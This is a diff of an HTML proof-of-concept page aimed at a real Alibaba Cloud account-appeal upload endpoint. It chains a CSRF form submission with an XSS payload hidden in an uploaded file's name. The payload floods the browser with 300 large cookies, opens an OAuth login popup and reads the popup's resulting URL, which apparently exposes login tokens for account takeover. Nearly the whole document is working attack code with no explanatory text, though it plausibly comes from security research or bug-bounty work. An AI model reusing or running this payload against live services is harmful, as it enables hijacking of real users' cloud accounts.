@@ -1,7 +1,7 @@
 <html>
   <body>
     <h1>CSRF PoC</h1>
-    <form id="csrf-form" action="https://account.alibabacloud.com/account_appeal_intl/uploadWorkOrderAttachments.json" method="POST" enctype="multipart/form-data">
+    <form id="csrf-form" action="https://account.alibabacloud.com/account_appeal_intl/uploadWorkOrderAttachments.json#test" method="POST" enctype="multipart/form-data">
       <input type="hidden" name="_csrf_token_" value="attacker" />
       <input type="hidden" name="sid" value="1679468035442931" />
       <input type="hidden" name="noCaptcha_sid" value="test" />
@@ -21,7 +21,7 @@
         const blob = new Blob([content], { type: 'image/png' });
 
         // 2. Create a File object with the name "minimal.png"
-        const file = new File([blob], "minimal.png", { type: 'image/png' });
+        const file = new File([blob], "<html id=test><html onbeforematch='for(i=1;i<301;i++)document.cookie=`testCookie${i}=${`A`.repeat(1200)}_${i};path=${String.fromCharCode(47)};`;b=decodeURIComponent(`https%3A%2F%2Fpassport.alibabacloud.com%2Fsns_oauth.htm%3FappName%3Dintl-aliyun%26appEntrance%3Daliyun_third%26type%3Dgoogle%26lang%3Den_US%26returnUrl%3Dhttps%25253A%25252F%25252Faccount.alibabacloud.com%25253A443%25252Flogin%25252Flogin_aliyun.htm%25253Foauth_callback%25253Dhttps%2525253A%2525252F%2525252Fwww.alibabacloud.com%2525252F%252526isQr%25253Dfalse%252526notNeedHardware%25253D0%252526aliyunid_third_login_state%25253Dw6Toxnh56EDXuf8n%26returnUrlEncoded%3Dtrue%26isMobile%3Dfalse%26responseAction%3Dtop_redirect%26loginAction%3DloginResult%26accounttraceid%3D519dc3853a4041a7a06230105a0df76ebfgz`);w=window.open(b,`e`,`width=600,height=400`);(f=()=>{setTimeout(()=>{try{l=w.location;if(l!=`about:blank`){alert(l);w.close();return}}catch(e){}f()},100)})()'><html hidden=until-found>", { type: 'image/png' });
 
         // 3. Use DataTransfer to simulate a user selecting the file
         const dataTransfer = new DataTransfer();
